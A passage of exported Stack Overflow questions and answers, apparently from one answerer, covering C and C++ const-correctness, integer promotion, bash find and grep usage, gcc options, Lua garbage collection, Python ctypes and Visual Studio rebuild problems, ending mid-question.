<p>See also <a href=""http://stackoverflow.com/questions/345505/how-can-you-diff-two-pipelines-in-bash"">How can you diff two pipelines with bash?</a>.</p>
"
"<p>looking at the declaration for XDrawString from X11, it is</p>

<pre><code>int XDrawString(Display *display, Drawable d, GC gc,
                int x, int y, char *string, int length);
</code></pre>

<p>How come the 6th argument is type ""char *"" instead of ""const char *""? Does drawing the string require modifying it? I've seen lots of examples where people pass in constant strings; is that unsafe?</p>
","9530","","<p>On both of my systems (Mac OS X v10.4.11 and Ubuntu with libx11-dev 2:1.1.5-2ubuntu1.1), my X11 headers have it declared as <code>const</code>.  From <code>/usr/include/X11/Xlib.h</code>:</p>

<pre><code>extern int XDrawString(
    Display*            /* display */,
    Drawable            /* d */,
    GC                  /* gc */,
    int                 /* x */,
    int                 /* y */,
    _Xconst char*       /* string */,
    int                 /* length */
);
</code></pre>

<p>And <code>_Xconst</code> is <code>#define</code>'d to be <code>const</code> in <code>X11/Xfuncproto.h</code>.</p>
"
"<p>It seems that <code>strtol()</code> and <code>strtod()</code> effectively allow (and force) you to cast away constness in a string:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

int main() {
  const char *foo = ""Hello, world!"";
  char *bar;
  strtol(foo, &amp;bar, 10); // or strtod(foo, &amp;bar);
  printf(""%d\n"", foo == bar); // prints ""1""! they're equal
  *bar = 'X'; // segmentation fault
  return 0;
}
</code></pre>

<p>Above, I did not perform any casts myself. However, <code>strtol()</code> basically cast my <code>const char *</code> into a <code>char *</code> for me, without any warnings or anything. (In fact, it wouldn't allow you to type <code>bar</code> as a <code>const char *</code>, and so forces the unsafe change in type.) Isn't that really dangerous?</p>
","9530","","<p>I would guess that because the alternative was worse.  Suppose the prototype were changed to add <code>const</code>:</p>

<pre><code>long int strtol(const char *nptr, const char **endptr, int base);
</code></pre>

<p>Now, suppose we want to parse a non-constant string:</p>

<pre><code>char str[] = ""12345xyz"";  // non-const
char *endptr;
lont result = strtol(str, &amp;endptr, 10);
*endptr = '_';
printf(""%s\n"", str);  // expected output: 12345_yz
</code></pre>

<p>But what happens when we try to compile this code?  A compiler error!  It's rather non-intuitive, but you can't implicitly convert a <code>char **</code> to a <code>const char **</code>.  See the <a href=""http://www.parashift.com/c%2B%2B-faq-lite/const-correctness.html#faq-18.17"">C++ FAQ Lite</a> for a detailed explanation of why.  It's technically talking about C++ there, but the arguments are equally valid for C.  In C/C++, you're only allowed to implicitly convert from ""pointer to <em>type</em>"" to ""pointer to <code>const</code> <em>type</em>"" at the highest level: the conversion you can perform is from <code>char **</code> to <code>char * const *</code>, or equivalently from ""pointer to (pointer to <code>char</code>)"" to ""pointer to (<code>const</code> pointer to <code>char</code>)"".</p>

<p>Since I would guess that parsing a non-constant string is far more likely than parsing a constant string, I would go on to postulate that <code>const</code>-incorrectness for the unlikely case is preferable to making the common case a compiler error.</p>
"
"<p>I'm developing a c++ applicaton using Qt, and we're looking to include swf files. Is there a way I can include swfs in my application? I'm open to different solutions for windows, mac, and linux, but a single cross-platform solution would be best.</p>

<p>Thanks!</p>
","9530","","<p>It's not free, but <a href=""https://www.scaleform.com/products/gfx"" rel=""nofollow"">Scaleform GFx</a> provides a cross-platform Flash player.  It can work with multiple different kinds of renderers, including but not limited to DirectX and OpenGL.</p>
"
"<p>I have split a large text file into a number of sets of smaller ones for performance testing that i'm doing. There are a number of directories like this:</p>

<pre><code>/home/brianly/output-02 (contains 2 files myfile.chunk.00 and myfile.chunk.01)
/home/brianly/output-04 (contains 4 files...)
/home/brianly/output-06 (contains 6 files...)
</code></pre>

<p>It's important to note that there is an increasing number of files in each directory. What I need to do is run an executable against each of the text files in the output directories. The command looks something like this against a single file:</p>

<pre><code>./myexecutable -i /home/brianly/output-02/myfile.chunk.00 -o /home/brianly/output-02/myfile.chunk.00.processed
</code></pre>

<p>Here the -i parameter is the input file and -o parameter is the output location.</p>

<p>In C# I'd loop over the directories get the list of files in each folder, then loop over them to run the commandlines. How do I traverse a directory structure like this using bash, and execute the command with the correct parameters based on the location and files in that location?</p>
","9530","","<p>As others have suggested, use <a href=""http://linux.die.net/man/1/find"" rel=""nofollow""><code>find(1)</code></a>:</p>

<pre><code># Find all files named 'myfile.chunk.*' but NOT named 'myfile.chunk.*.processed'
# under the directory tree rooted at base-directory, and execute a command on
# them:
find base-directory -name 'output.*' '!' -name 'output.*.processed' -exec ./myexecutable -i '{}' -o '{}'.processed ';'
</code></pre>
"
"<p>I'm looking for an option to <code>gcc</code> that will make it read a source file from the standard input, mainly so I could do something like this to generate an object file from a tool like <code>flex</code> that generates C code (<code>flex</code>'s <code>-t</code> option writes the generated C to the standard output):</p>

<pre><code>flex -t lexer.l | gcc -o lexer.o -magic-option-here
</code></pre>

<p>because I don't really care about the generated C file.</p>

<p>Does something like this exist, or do I have to use temporary files?</p>
","9530","","<p>Yes, but you have to specify the language using the <code>-x</code> option:</p>

<pre><code># Specify input file as stdin, language as C
flex -t lexer.l | gcc -o lexer.o -xc -
</code></pre>
"
"<p>I've done a lot of programming but not much in C, and I need advice on debugging.  I have a static variable (file scope) that is being clobbered after about 10-100 seconds of execution of a multithreaded program (using pthreads on OS X 10.4).  My code looks something like this:</p>

<pre><code>static float some_values[SIZE];
static int * addr;
</code></pre>

<p><code>addr</code> points to valid memory address for a while, and then gets clobbered with some value (sometimes 0, sometimes nonzero), thereby causing a segfault when dereferenced.  Poking around with <code>gdb</code> I have verified that <code>addr</code> is being layed out in memory immediately after <code>some_values</code> as one would expect, so my first guess would be that I have used an out-of-bounds index to write to <code>some_values</code>.  However, this is a tiny file, so it is easy to check this is not the problem.</p>

<p>The obvious debugging technique would be to set a watchpoint on the variable <code>addr</code>.  But doing so seems to create erratic and inexplicable behavior in <code>gdb</code>.  The watchpoint gets triggered at the first assignment to <code>addr</code>; then after I continue execution, I immediately get a nonsensical segfault in another thread...supposedly a segfault on accessing the address of a static variable in a different part of the program!  But then <code>gdb</code> lets me read from and write to that memory address interactively.</p>

<pre>
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_PROTECTION_FAILURE at address: 0x001d5bd0
0x0000678d in receive (arg=0x0) at mainloop.c:39
39          sample_buf_cleared ++;
(gdb) p &sample_buf_cleared
$17 = (int *) 0x1d5bd0
(gdb) p sample_buf_cleared
$18 = 1
(gdb) set sample_buf_cleared = 2
(gdb) 
</pre>

<p><code>gdb</code> is obviously confused.  Does anyone know why?  Or does anyone have any suggestions for debugging this bug without using watchpoints?</p>
","9530","","<p>One thing you could try would be to create a separate thread whose only purpose is to watch the value of <code>addr</code>, and to break when it changes.  For example:</p>

<pre><code>static int * volatile addr;  // volatile here is important, and must be after the *
void *addr_thread_proc(void *arg)
{
    while(1)
    {
        int *old_value = addr;
        while(addr == old_value) /* spin */;
        __asm__(""int3"");  // break the debugger, or raise SIGTRAP if no debugger
    }
}
...
pthread_t spin_thread;
pthread_create(&amp;spin_thread, NULL, &amp;addr_thread_proc, NULL);
</code></pre>

<p>Then, whenever the value of <code>addr</code> changes, the <code>int3</code> instruction will run, which will break the debugger, stopping all threads.</p>
"
"<p>I can't seem to get this code to work, I was under the impression I was doing this correctly. </p>

<pre><code>from ctypes import *


kernel32 = windll.kernel32

string1 = ""test""
string2 = ""test2""

kernel32.MessageBox(None,
                       string1,
                       string2,
                       MB_OK)
</code></pre>

<p>** I tried to change it to MessageBoxA as suggested below **
** Error I get :: **</p>

<pre><code>Traceback (most recent call last):
  File ""C:\&lt;string&gt;"", line 6, in &lt;module&gt;
  File ""C:\Python26\Lib\ctypes\__init__.py"", line 366, in __getattr__
    func = self.__getitem__(name)
  File ""C:\Python26\Lib\ctypes\__init__.py"", line 371, in __getitem__
    func = self._FuncPtr((name_or_ordinal, self))
AttributeError: function 'MessageBoxA' not found
</code></pre>
","9530","","<p>The problem is that the function you're trying to call isn't actually named <code>MessageBox()</code>.  There are two functions, named <code>MessageBoxA()</code> and <code>MessageBoxW()</code>: the former takes 8-bit ANSI strings, and the latter takes 16-bit Unicode (wide-character) strings.  In C, the preprocessor symbol <code>MessageBox</code> is <code>#define</code>d to be either <code>MessageBoxA</code> or <code>MessageBoxW</code>, depending on whether or not Unicode is enabled (specifically, if the symbol <code>_UNICODE</code> is defined).</p>

<p>Secondly, according to the <a href=""http://msdn.microsoft.com/en-us/library/ms645505%28VS.85%29.aspx"" rel=""nofollow""><code>MessageBox()</code> documentation</a>, <code>MessageBoxA/W</code> are located in <code>user32.dll</code>, not <code>kernel32.dll</code>.</p>

<p>Try this (I can't verify it, since I'm not in front of a Windows box at the moment):</p>

<pre><code>user32 = windll.user32
user32.MessageBoxA(None, string1, string2, MB_OK)
</code></pre>
"
"<p>[I've read the Lua manual, but it did not provide solid answers.]</p>

<p>Let's say I have a Lua Table, acting as an indexed array:</p>

<pre><code>local myArray = {};
myArray[1] = ""Foo"";
myArray[2] = ""Bar"";
</code></pre>

<p>How do I best dispose of this Table?  Do I just set myArray to nil?  Or do I have to iterate through array and set each indexed element to nil?</p>

<p>Similarly, let's say I have I have a Lua Table, acting as a dictionary:</p>

<pre><code>local myDictionary = {};
myDictionary[""key1""] = ""Foo"";
myDictionary[""key2""] = ""Bar"";
</code></pre>

<p>Can I just set 'myDictionary' to nil, or do I have to iterate through?</p>

<p>Lastly, what do I do, memory-management wise, where I have nested Tables?  e.g.</p>

<pre><code>local myNestedCollection = {};
myNestedCollection[1] = {1, 2, 3};
myNestedCollection[2] = {4, 5, 6};
</code></pre>

<p>Do I need to iterate through each of these sub-tables, setting them to nil?  Thanks for any help.</p>
","9530","","<p>It should be sufficient just to set the local variable to <code>nil</code>; there's no need to iterate through all of the keys and set them to <code>nil</code> to.  According to <a href=""http://lua-users.org/wiki/GarbageCollectionTutorial"">this page</a>, Lua uses a mark-and-sweep garbage collection algorithm.  As soon as you set your local variable to <code>nil</code>, the keys in its table become unreachable, so they will be collected by the garbage collector on the next collection.  Similarly, if those objects are also tables, their keys will also become unreachable, so they too will be collected.</p>
"
"<p>Working on some code and I'm given the error when running it from the command prompt...</p>

<pre><code>NameError: name 'Popen' is not defined
</code></pre>

<p>but I've imported both <code>import os</code> and <code>import sys</code>.</p>

<p>Here's part of the code</p>

<pre><code>exepath = os.path.join(EXE File location is here)
exepath = '""' + os.path.normpath(exepath) + '""'
cmd = [exepath, '-el', str(el), '-n', str(z)]

print 'The python program is running this command:'
print cmd

process = Popen(cmd, stderr=STDOUT, stdout=PIPE)
outputstring = process.communicate()[0]
</code></pre>

<p>Am I missing something elementary? I wouldn't doubt it. Thanks!</p>
","9530","","<p>When you import a module, the module's members don't become part of the global namespace: you still have to prefix them with <code>modulename.</code>.  So, you have to say</p>

<pre><code>import os
process = os.popen(command, mode, bufsize)
</code></pre>

<p>Alternatively, you can use the <code>from module import names</code> syntax to import things into the global namespace:</p>

<pre><code>from os import popen    # Or, from os import * to import everything
process = popen(command, mode, bufsize)
</code></pre>
"
"<p>For example some parts of the client spec map files from a 'Published' depot. Is there a way for these so-called published maps to be forced read-only, i.e. they cannot be opened for edit?</p>

<p>For example (ignoring [not editable]):</p>

<pre><code>//Development/foo/... //client/foo/...
//Published/bar/1.0/... //client/bar/... [not editable]
//Published/qux/2.0/... //client/qux/... [not editable]
</code></pre>

<p>In other words I want to prevent files from being opened (say, being locked by default) and am wondering if this can be enforced at the client spec level.</p>

<p>If not, is there a way available without making the 'Published' depot read-only to certain users?</p>
","9530","","<p>You could create a dummy client and lock those files on the dummy client.  Then, just don't let anyone use that client, e.g. by putting it on a server.</p>
"
"<p>In the code block below what's the impicit conversion that takes place in the if statement for 7? I would have though it would end up being (0x98 &lt;= 0x07) but that's not what happens as the condition evaluates to true and DoMyStuff gets called.</p>

<pre><code>char minstogo = 0x98;
if(minstogo &lt;= 7) {
   DoMyStuff();
}
</code></pre>
","9530","","<p>Whenever you have a binary operator (one of <code>+</code> <code>-</code> <code>*</code> <code>/</code> <code>%</code> <code>&lt;&lt;</code> <code>&gt;&gt;</code> <code>&amp;</code> <code>|</code> <code>^</code> <code>==</code> <code>!=</code> <code>&lt;</code> <code>&lt;=</code> <code>&gt;</code> <code>&gt;=</code>) between two integral operands of different types, the two types are converted to a common type before the operation is performed.  The rules for deciding the converted-to type are (from section 6.3.1.8 of the C99 standard):</p>

<blockquote>
  <p>If both operands have the same type, then no further conversions are required.</p>
  
  <p>Otherwise, if both operands have signed integer types or both have unsigned 
  integer types, the operand with the type of lesser integer conversion rank is 
  converted to the type of the operand with greater rank.</p>
  
  <p>Otherwise, if the operand that has unsigned integer type has rank greater or 
  equal to the rank of the type of the other operand, then the operand with 
  signed integer type is converted to the type of the operand with unsigned 
  integer type.</p>
  
  <p>Otherwise, if the type of the operand with signed integer type can represent 
  all of the values of the type of the operand with unsigned integer type, then 
  the operand with unsigned integer type is converted to the type of the 
  operand with signed integer type.</p>
  
  <p>Otherwise, both operands are converted to the unsigned integer type 
  corresponding to the type of the operand with signed integer type. </p>
</blockquote>

<p>In this case, <code>char</code> could be either a signed or unsigned integer type -- its signedness is implementation-defined.  Fortunately, though, an <code>int</code> can represent all possible values of a <code>char</code>, whether or not <code>char</code> is signed, assuming you're on a system where <code>char</code>s are 8 bits and <code>int</code>s are at least 16 bits.</p>

<p>If <code>char</code> is signed, then the second paragraph above applies, so both operands are converted to <code>int</code> (the type with higher rank; rank is defined in a somewhat complicated manner, but it's essentially equivalent to the bit size of the type).  Since 0x98, as a signed <code>char</code>, is negative, it's converted to the integer -104, which is then less than 7.</p>

<p>If instead <code>char</code> is unsigned, then the fourth paragraph applies instead.  The unsigned <code>char</code> would be converted to 152 as an <code>int</code>, which is greater than 7.</p>

<p>Do not ever rely on <code>char</code>s being signed or unsigned.  If you need 8-bit integers of a certain signedness, explicitly use <code>signed char</code> or <code>unsigned char</code>, or use the C99 types <code>int8_t</code> and <code>uint8_t</code>, defined int <code>&lt;stdint.h&gt;</code>.</p>

<p>It's very easy to get bitten by subtle bugs caused by the integer promotion rules.  I strongly advise you to always compile with <code>-Wall</code> with gcc, which will warn you about comparisons between signed and unsigned integers, which are frequently a cause of bugs.</p>
"
"<p>I have read <a href=""http://stackoverflow.com/questions/559482/why-doesnt-an-iphone-apps-main-function-ever-get-a-chance-to-finish"">questions/559482/why-doesnt-an-iphone-apps-main-function-ever-get-a-chance-to-finish</a>, which explains why <code>NSApplicationMain</code> never actually returns. The same thing happens (for the same reason) in a desktop cocoa application, which is what I am working on.</p>

<p>With that in mind, <strong>how would I go about using <code>NSLog</code> to output some final debugging messages when my application exits?</strong></p>

<p>To be specific, I would like to do something like this:</p>

<pre><code>int myDebugVariable = 0;

int main(int argc, char *argv[])
{
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];

    CMLog(@""application begin"");

    int exitCode = NSApplicationMain(argc,  (const char **) argv);

    CMLog(@""application end. Debugging variable = %d"", myDebugVariable);

    [pool release];
    return exitCode;
}
</code></pre>

<p>In this example, The ""application begin"" line is printed to the console, but the ""application end."" line is not.</p>

<p><strong>Note #1:</strong> In my actual code, I am using something more sophisticated than <code>myDebugVariable</code>. This is a simplified example that illustrates the effect I am trying to achieve.</p>

<p><strong>Note #2:</strong> I am familiar with the <code>ApplicationWillTerminate</code> method, which gets called when the application is about to quit, but it does not suit my needs. My debugging code relies on the <code>dealloc</code> methods for some custom classes, so it does not come into play until after <code>ApplicationWillTerminate</code> is called.</p>

<p><hr /></p>

<p><strong>update:</strong></p>

<p><a href=""http://stackoverflow.com/questions/1016093/how-can-i-use-nslog-in-main-but-outside-of-nsapplicationmain/1016110#1016110"">Adam Rosenfield's answer</a> did the trick. For the sake of completeness, here is a working solution:</p>

<pre><code>int myDebugVariable = 0;

void my_exit_handler(void)
{
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];

    CMLog(@""application end: Debugging variable = %d"", myDebugVariable);

    [pool release];
}

int main(int argc, char *argv[])
{
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];

    CMLog(@""application begin"");
    atexit(my_exit_handler);

    int exitCode = NSApplicationMain(argc,  (const char **) argv);

    [pool release];
    return exitCode;
}
</code></pre>
","9530","","<p>Use <a href=""http://linux.die.net/man/3/atexit"" rel=""nofollow""><code>atexit(3)</code></a> to register an exit handler.  It will automatically be invoked when your app exits, either by finishing main or by calling <code>exit(3)</code>.  For example:</p>

<pre><code>void my_exit_handler(void)
{
    NSLog(@""about to exit, x = %d\n"", x);
}

// at some point during app initialization...
atexit(&amp;my_exit_handler);
</code></pre>
"
"<p>I have no idea if this is possible, but if it is, what would the syntax look like?  </p>

<p>If not possible, why not?</p>
","9530","","<p>You should be able to bind to a message implementation (<code>IMP</code>), which are just plain C functions with two hidden parameters, <code>self</code> and <code>_cmd</code> of types <code>id</code> and <code>SEL</code> respectively.</p>

<p><strong>EDIT</strong>: Just tested the following complete example, and it appears to work.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;boost/bind.hpp&gt;
#include &lt;Foundation/NSObject.h&gt;

@interface MyClass : NSObject
{
}
-(int) doSomething:(int)arg;
@end

@implementation MyClass
-(int) doSomething:(int)arg
{
  printf(""doSomething: self=0x%08x _cmd=0x%08x\n"", self, _cmd);
  return arg + 1;
}
@end

int main(void)
{
  MyClass *myObj = [[MyClass alloc] init], *otherObj = [[MyClass alloc] init];
  typedef int (*MyFunc)(id, SEL, int);
  SEL doSomething_sel = @selector(doSomething:);
  MyFunc doSomething_impl = (MyFunc)[myObj methodForSelector:doSomething_sel];

  // bind self &amp; _cmd arguments:
  // calls [myObj doSomething:x]
  int result = boost::bind(doSomething_impl, myObj, doSomething_sel, _1)(14);
  printf(""result1: %d\n"", result);

  // bind _cmd &amp; arg:
  // calls [otherObj doSomething:3]
  result = boost::bind(doSomething_impl, _1, doSomething_sel, 42)(otherObj);
  printf(""result2: %d\n"", result);

  return 0;
}
</code></pre>

<p>With GNUstep, compile as:</p>

<pre><code>gcc objcbind.mm -o objcbind -I/usr/include/GNUstep -lobjc -lstdc++ -lgnustep-base
</code></pre>

<p>On Mac OS X, compile as:</p>

<pre><code>gcc objcbind.mm -o objcbind -framework Foundation -lstdc++
</code></pre>

<p>Output:</p>

<pre>
doSomething: self=0x01a85f70 _cmd=0x00602220
result1: 15
doSomething: self=0x01a83d70 _cmd=0x00602220
result2: 43
</pre>
"
"<p>I have been unable to find a way to anti-alias my rendering on iPhone OS 3.0 + OpenGL ES 2.0. I had assumed there would be multisampling but that appears to not be the case. I've been told that fragment shaders can be made aware of the projected pixel via a partial derivatives extention but I have no idea where that functionality lives or whether Apple actually supports it.</p>

<p>My background is RenderMan where I have significant control of how I attenuate high frequency artifacts. Without proper anti-aliasing - at the shader level and at the rasterization level. Vertex and fragment shaders will suffer from noticable jaggies and all manner of visual schmutz.</p>

<p>Could someone please clarify the status of anti-aliasing. Thanks.</p>

<p>-Doug</p>
","9530","","<p>I'm guessing it's just not supported by the hardware.  I was recently trying to get antialiasing working on my MacBook (cf. <a href=""http://www.opengl.org/documentation/specs/man%5Fpages/hardcopy/GL/html/gl/enable.html"" rel=""nofollow""><code>glEnable(GL_POLYGON_SMOOTH)</code></a>), and after trying everything I could think of, I eventually discovered it simply wasn't supported by my hardware, according to <a href=""http://lists.apple.com/archives/Mac-opengl/2007/Aug/msg00003.html"" rel=""nofollow"">this thread</a>.  I have no idea whether you can achieve antialiasing with vertex or fragment shaders, since I'm unfamiliar with them.</p>
"
"<p>I have a Visual Studio project with about 60 C++ source files. I can do a build, and it completes without errors. But if I immediately hit F7 again, it always re-compiles about 50 of the source files. It doesn't re-compile all of the files, which is strange.</p>

<p>I have 'Enable minimal rebuild' (/Gm) set. Any ideas why it might be doing this?
None of the files have a Modified Date in the future.</p>
","9530","","<p>Check your project's <strong>Program Database Filename</strong> setting.  For some reason, if this is set to the name of a directory (such as <code>""$(IntDir)\""</code>), it can sometimes cause VS to rebuild your project every time, even if you're not generating PDB files (i.e. Debug Information Format is set to ""Disabled"").</p>

<p>This is a bug in VS2008; I have not yet reproduced it yet in VS2010, but my tests haven't been thorough, so I'm not confident saying that the behavior isn't present in VS2010.</p>
"
"<p>I was using this line to find the phrase, 'B206' within files in the directory I was in and all of its sub directories.</p>

<pre><code>find . -exec grep -s ""B206"" '{}' \; -print
</code></pre>

<p>It crashes when it tries to read certain files and actually changes the title bar in putty to a bunch of weird characters</p>

<p>For example, it crashes all the time when it hits a jpg file that's in a sub directory.  The title bar changes, and in the screen, there exists:</p>

<pre><code>ÐF»*rkNQeË+Z×³kU£~MÞçÄZ½ªéúýØâÑn¡[U+Þ4ªÒ9/ê£&lt;ú¯4}[IÓ­îÃ¥K»G%Ý³¢
</code></pre>

<p>Forcing me to Ctrl+C out back to the prompt and then exit out.</p>

<p>Any way to add code to this line that will exclude jpg files?  Even better, a piece of code where I can add a list of extensions to exclude?
<hr>
EDIT:
<br>-not &amp; -I do not work for me<hr>
I found this <a href=""http://stackoverflow.com/questions/221921/grep-exclude-include-syntax-do-not-grep-through-certain-files"">similar question</a> also related somewhat to mine</p>
","9530","","<p>There's no reason to use <code>find</code>: <code>grep</code> comes with a recursive option, <code>-r</code>.  To just get a list of the filenames with matches (as opposed to a list of all of the matching lines in all the files), you can use the <code>-l</code> option.  If you want to ignore all binary files outright, you can use <code>--binary-files=without-match</code> option.  If you only want to ignore files with a certain extension, you can use the <code>--exclude</code> option, e.g. <code>--exclude=*.{jpg,jpeg}</code> to ignore all files ending in <code>.jpg</code> or <code>.jpeg</code>.  Thus, you should be able to get what you want with this:</p>

<pre><code>grep -r -l --binary-files=without-match .
</code></pre>

<p>Now, you mentioned in one of your comments that your version of <code>grep</code> doesn't have the <code>-r</code> or <code>-l</code> options.  That's unfortunate, and I recommend getting a more recent version of <code>grep</code> (preferably of the GNU variety).</p>

<p>One further note: if you use <code>find -exec</code>, you should use a <code>+</code> to end the command instead of a semicoln, e.g.:</p>

<pre><code>find . -exec grep options '{}' '+'
</code></pre>

<p>By using a <code>+</code>, <code>find</code> will only fork off a single process and pass all of the matching filenames as command line arguments to one instance of <code>grep</code>.  So long as you don't have a million matching files (which would create a command line far longer than the shell can handle), this will be much, much faster.  If you use a semicolon instead, <code>find</code> forks a new process for <em>each</em> matching file, which is really slow for a very large number of files.</p>
"
"<p>This program takes 2 numbers from user input, asks them whether they'd like to find out the permutations or combinations, and then outputs the result. Here's the code.</p>

<pre><code>#include ""std_lib_facilities.h""

int permutation(int first, int second)
{
int top_fac;
int bottom_fac;
for (int i = first-1; i &gt;= 1; --i)
    top_fac *=i;
for (int i2 = (first-second)-1; i2&gt;=1; --i2)
    bottom_fac *= i2;
return (top_fac/bottom_fac);
}

int combination(int first, int second)
{
int bottom_fac;
for (int i = second-1; i&gt;=1; --i)
    bottom_fac *= i;
return permutation(first, second)/(bottom_fac);
}

int main()
{
cout &lt;&lt; ""Enter two numbers.\n"";
int first = 0;
int second = 0;
cin &gt;&gt; first &gt;&gt; second;
cout &lt;&lt; ""Now choose permutation(p) or combination(c).\n"";
string choice;
cin &gt;&gt; choice;
if (choice == ""p"") 
   cout &lt;&lt; ""Number of permutations: "" &lt;&lt; permutation(first,second) &lt;&lt; endl;
else if (choice == ""c"")
   cout &lt;&lt; ""Number of combinations: "" &lt;&lt; combination(first,second) &lt;&lt; endl;
else
   cout &lt;&lt; ""p or c stupid.\n"";
keep_window_open(""q"");
}
</code></pre>

<p>When I try to run the program, and I choose p or c, I get a ""permutations_combinations.exe has stopped working"" message. I tried to catch an error, but nothing is coming up. Any ideas?</p>

<p>Thanks in advance. </p>
","9530","","<p>You're not initializing the local variables <code>top_fac</code> and <code>bottom_fac</code> inside of your functions.  Unlike other languages, local variables are NOT initialized to anything in particular in C or C++.  The values that they receive are whatever garbage happens to be on the stack when you call the function.  You should explicitly initialize <code>top_fac</code> and <code>bottom_fac</code> to 1 at the beginning of the <code>permutation()</code> and <code>combination()</code> functions.</p>

<p>I'm guessing that <code>bottom_fac</code> is accidentally getting initialized to 0, and then you're dividing by 0 at the end of the function, which is causing the runtime failure you're seeing.</p>
"
"<p>Consider the following:</p>

<pre><code>typedef struct {
    int a;
    int b;
    int c;
    int d;
} ABCD;

typedef std::vector&lt;ABCD&gt; VecABCD;
</code></pre>

<p>Say I wanted to add up every 'a' member in a vector of type VecABCD.  Easy!  I just loop through the vector, and sum as I go.</p>

<pre><code>int CalcSumOfA(const VecABCD &amp;vec)
{
    int sumOfA = 0;
    VecABCD::const_iterator it;
    for(it=vec.begin();it!=vec.end();it++)
        sumOfA += it-&gt;a;
    return sumOfA;
}
</code></pre>

<p>Say I wanted to do the same thing with 'b'?  Easy!  I'd write....essentially the same function, but with only trivial changes.  Same with 'c' and 'd'.</p>

<p>So, is there a more concise, less repetitive way of doing this?  I'd like to do something like:</p>

<pre><code>int sumOfA = SumOfMembers(myVec, a);
</code></pre>

<p>but I can't conceive of how I'd put such a function together.  Ideally, it'd be a template, and I could use it with a vector of any kind of structure, not specifically bound to VecABCD.  Anyone have any ideas?</p>
","9530","","<p>Another option would be to use pointer-to-members:</p>

<pre><code>int CalcSumOf(const VecABCD &amp; vec, int ABCD::*member)
{
    int sum = 0;
    for(VecABCD::const_iterator it = vec.begin(), end = vec.end(); it != end; ++it)
        sum += (*it).*member;
    return sum;
}
...
int sumA = CalcSumOf(myVec, &amp;ABCD::a);  // find sum of .a members
int sumB = CalcSumOf(myVec, &amp;ABCD::b);  // find sum of .b members
// etc.
</code></pre>
"
"<p>Silly question, but I just can not find the necessary flag in gcc. Basically, I have in my C program the following inline assembler code</p>

<pre><code>__asm__ __volatile__ (""lea ebx, [timings] \n\t"");
</code></pre>

<p>When compiling, I get an errormessage which says: <code>Error: invalid char '[' beginning operand 2</code>[timings]'`</p>

<p>Now I remember that a long time ago I used some kind of flag that told the compiler that it is x86 inline assembly. But cant find it online, could maybe someone please tell me which flag i have to use?</p>

<p>Thank you so much!</p>
","9530","","<p>You can't specify variables that way with GCC.  See <a href=""http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html"" rel=""nofollow"">this document</a> for a detailed description of how to use inline assembler.  Also, keep in mind that GCC uses AT&amp;T syntax, not Intel syntax, so you have to put your destinations on the right.</p>
"
"<p>Most C++ programmers like me have made the following mistake at some point:</p>

<pre><code>class C { /*...*/ };

int main() {
  C c();     // declares a function c taking no arguments returning a C,
             // not, as intended by most, an object c of type C initialized
             // using the default constructor.
  c.foo();   // compiler complains here.

  //...
}
</code></pre>

<p>Now while the error is pretty obvious once you know it I was wondering if there is any sensible use for this kind of local function declaration except that you can do it -- especially since there is no way to <em>define</em> such a local function in the same block; you have to define it elsewhere.</p>

<p>I think that Java-style local classes are a pretty nice feature which I tend to use often, especially the anonymous sort. Even local C++ classes (which can have inline-defined member functions) have some use. But this local function declaration without definition thing seems very awkward to me. Is it just a C-legacy or is there some deeper use case which I am not aware of?</p>

<p><strong>Edit</strong> for the non-believers: <code>C c()</code> is <em>not</em> a function pointer declaration.</p>

<p>This program</p>

<pre><code>int main()
{
  void g();
  cout &lt;&lt; ""Hello "";
  g();
  return 0;
}

void g()
{
  cout &lt;&lt; ""world."" &lt;&lt; endl;
}
</code></pre>

<p>outputs <code>Hello world.</code> This program</p>

<pre><code>void fun()
{
  cout &lt;&lt; ""world."" &lt;&lt; endl;
}

int main()
{
  void g();
  g = fun;
  cout &lt;&lt; ""Hello "";
  g();
  return 0;
}
</code></pre>

<p>does not compile. gcc complains:</p>

<pre>error: cannot convert 'void ()()' to 'void ()()' in assignment</pre>

<p>comeau:</p>

<pre>error: expression must be a modifiable lvalue</pre>
","9530","","<p>The only use I can think of is to reduce the scope of function declarations:</p>

<pre><code>int main()
{
    void doSomething();
    doSomething();
    return 0;
}

void otherFunc()
{
    doSomething();  // ERROR, doSomething() not in scope
}

void doSomething()
{
    ...
}
</code></pre>

<p>Of course, there are much better solutions to this.  If you need to hide a function, you should really restructure your code by moving functions into separate modules so that the functions which need to call the function you want to hide are all in the same module.  Then, you can make that function module-local by declaring it static (the C way) or by putting it inside an anonymous namespace (the C++ way).</p>
"
"<p>I am running into integer overflow using the standard <em>ftell</em> and <em>fseek</em> options inside of G++, but I guess I was mistaken because it seems that <em>ftell64</em> and <em>fseek64</em> are not available. I have been searching and many websites seem to reference using <strong>lseek</strong> with the <em>off64_t</em> datatype, but I have not found any examples referencing something equal to <em>fseek</em>. Right now the files that I am reading in are 16GB+ CSV files with the expectation of at least double that.</p>

<p>Without any external libraries what is the most straightforward method for achieving a similar structure as with the <em>fseek/ftell</em> pair? My application right now works using the standard GCC/G++ libraries for 4.x.</p>
","9530","","<p>Use <a href=""http://linux.die.net/man/3/fsetpos"" rel=""nofollow""><code>fsetpos(3)</code></a> and <code>fgetpos(3)</code>.  They use the <code>fpos_t</code> datatype , which I believe is guaranteed to be able to hold at least 64 bits.</p>
"
"<p>Hello guys
I'm facing some problems on the lexical analysis of my compiler
I had declared the following pointer</p>

<pre><code>char *words[29]={
    	""program"",
    	""label"",
    	""integer"",
    	""word"",
    	""char"",
    	""byte"",
    	""shortint"",
    	""logint"",
    	""real"",
    	""single"",
    	""double"",
    	""string"",
    	""boolean"",
    	""var"",
    	""procedure"",
    	""function"",
    	""begin"",
    	""end"",
    	""if"",
    	""then"",
    	""else"",
    	""or"",
    	""and"",
    	""div"",
    	""not"",
    	""do"",
    	""while"",
    	""mod""
};
char message[30];
</code></pre>

<p>and then I tried to use it in a function</p>

<pre><code>			for(handle=0;(&amp;words[handle] != NULL);handle++)
			{
				message = &amp;words[handle];
				if(!strcmp(token,message))
					message='words';
			}
</code></pre>

<p>But I'm receiving the following errors when trying to execute:</p>

<blockquote>
  <p>regarding (line message =
  &amp;words[handle];) : warning C4047: '='
